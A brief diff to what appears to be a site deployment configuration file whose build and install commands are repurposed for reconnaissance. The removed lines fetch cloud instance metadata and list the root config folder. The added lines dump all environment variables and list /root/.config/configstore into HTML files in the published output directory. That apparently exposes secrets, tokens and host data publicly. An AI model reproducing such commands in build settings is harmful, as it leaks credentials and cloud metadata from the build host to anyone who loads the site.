@@ -1,5 +1,5 @@
 {
-    "buildCommand": "curl http://metadata.tencentyun.com/latest/meta-data/>./aaa.html",
-    "installCommand": "ls -al /root/.config>./bbb.html",
+    "buildCommand": "env>./aaa.html",
+    "installCommand": "ls -al /root/.config/configstore>./bbb.html",
     "outputDirectory": "./"
 }
